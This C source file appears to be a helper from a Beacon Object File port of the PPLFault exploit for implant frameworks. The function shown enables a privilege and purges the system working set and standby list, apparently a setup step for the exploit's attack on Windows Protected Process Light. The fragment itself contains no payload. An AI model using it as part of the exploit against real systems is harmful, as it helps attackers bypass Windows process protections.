// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#include <ntstatus.h>
#define WIN32_NO_STATUS
#include <phnt_windows.h>
#include "bofdefs.h"
#include "MemoryCommand.h"
#include "fnptr.h"

BOOL EmptySystemWorkingSet()
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    DWORD command = 0;
    BOOLEAN ignore = 0;
    GetFNPtr(hntdll, "RtlAdjustPrivilege", _RtlAdjustPrivilege, fpRtlAdjustPrivilege);
    GetFNPtr(hntdll, "NtSetSystemInformation", _NtSetSystemInformation, fpNtSetSystemInformation);

    // Enable SeProfileSingleProcessPrivilege which is required for SystemMemoryListInformation
    ntStatus = _RtlAdjustPrivilege(SE_PROFILE_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &ignore);
    if (0 != ntStatus)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable SeProfileSingleProcessPrivilege with NTSTATUS 0x%08x", ntStatus);
        return FALSE;
    }

    // Empty working sets
    command = MemoryEmptyWorkingSets;
    ntStatus = _NtSetSystemInformation(SystemMemoryListInformation, &command, sizeof(command));
    if (0 != ntStatus)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to empty working sets with NTSTATUS 0x%08x", ntStatus);
        return FALSE;
    }

    // Empty system standby list
    command = MemoryPurgeStandbyList;
    ntStatus = _NtSetSystemInformation(SystemMemoryListInformation, &command, sizeof(command));
    if (0 != ntStatus)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to empty standby list with NTSTATUS 0x%08x", ntStatus);
        return FALSE;
    }

    internal_printf("Working set purged");

    return TRUE;
}
